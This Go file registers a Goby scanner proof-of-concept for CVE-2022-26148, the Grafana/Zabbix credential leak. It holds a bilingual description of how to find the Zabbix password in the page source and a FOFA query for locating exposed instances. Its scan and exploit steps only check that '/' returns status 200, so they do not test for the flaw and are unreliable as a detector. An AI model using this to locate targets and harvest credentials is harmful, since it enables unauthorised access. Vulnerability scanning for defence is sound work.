package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Grafana Zabbix login Api Information Leakage Vulnerability (CVE-2022-26148)",
    "Description": "<p>Grafana is a set of open source monitoring tools provided by Grafana Labs that provide a visual monitoring interface. This tool is mainly used to monitor and analyze Graphite, InfluxDB and Prometheus, etc.</p><p>There is a security vulnerability in Grafana 7.3.4 and earlier versions, which originates from the integration of Grafana 7.3.4 and earlier versions with Zabbix, Zabbix password can be found in the api_jsonrpc.php HTML source code. When users log in or register, they can right-click to view the source code, use Ctrl-F to search for password in api_jsonrpc.php, and find Zabbix's account password and URL address.</p>",
    "Impact": "Grafana Zabbix Information Leakage (CVE-2022-26148)",
    "Recommendation": "<p>Pay attention to the official website update in time: <a href=\"https://grafana.com/grafana/download\">https://grafana.com/grafana/download</a></p>",
    "Product": "Grafana",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "Grafana 集成 Zabbix login 接口信息泄露漏洞（CVE-2022-26148）",
            "Description": "<p>Grafana是Grafana实验室的一套提供可视化监控界面的开源监控工具。该工具主要用于监控和分析Graphite、InfluxDB和Prometheus等。<br></p><p>Grafana 7.3.4版本及之前版本存在安全漏洞，该漏洞源于Grafana 7.3.4版本及之前版本与 Zabbix 集成时，Zabbix 密码可以在 api_jsonrpc.php HTML 源代码中找到。当用户登录或注册时，可以右键查看源码，使用Ctrl-F在api_jsonrpc.php中搜索password，可以发现Zabbix的账号密码和URL地址。<br></p>",
            "Impact": "<p>Grafana 7.3.4版本及之前版本存在安全漏洞，该漏洞源于Grafana 7.3.4版本及之前版本与 Zabbix 集成时，Zabbix 密码可以在 api_jsonrpc.php HTML 源代码中找到。当用户登录或注册时，可以右键查看源码，使用Ctrl-F在api_jsonrpc.php中搜索password，可以发现Zabbix的账号密码和URL地址。<br></p>",
            "Recommendation": "<p>及时关注官网更新：<a href=\"https://grafana.com/grafana/download\">https://grafana.com/grafana/download</a><br></p>",
            "Product": "Grafana",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Grafana Zabbix login Api Information Leakage Vulnerability (CVE-2022-26148)",
            "Description": "<p>Grafana is a set of open source monitoring tools provided by Grafana Labs that provide a visual monitoring interface. This tool is mainly used to monitor and analyze Graphite, InfluxDB and Prometheus, etc.<br></p><p>There is a security vulnerability in Grafana 7.3.4 and earlier versions, which originates from the integration of Grafana 7.3.4 and earlier versions with Zabbix, Zabbix password can be found in the api_jsonrpc.php HTML source code. When users log in or register, they can right-click to view the source code, use Ctrl-F to search for password in api_jsonrpc.php, and find Zabbix's account password and URL address.<br></p>",
            "Impact": "Grafana Zabbix Information Leakage (CVE-2022-26148)",
            "Recommendation": "<p>Pay attention to the official website update in time: <a href=\"https://grafana.com/grafana/download\">https://grafana.com/grafana/download</a><br></p>",
            "Product": "Grafana",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "title=\"Grafana\" && body=\"alexanderzobnin-zabbix-datasource\"",
    "GobyQuery": "title=\"Grafana\" && body=\"alexanderzobnin-zabbix-datasource\"",
    "Author": "abszse",
    "Homepage": "https://grafana.com",
    "DisclosureDate": "2022-03-30",
    "References": [
        "https://github.com/adampielak/nuclei-templates/blob/6aa6f7755bb30029398232855277dcd6b07f217a/cve-2022-26148-6730.yaml#L2"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2022-26148"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202203-1938"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
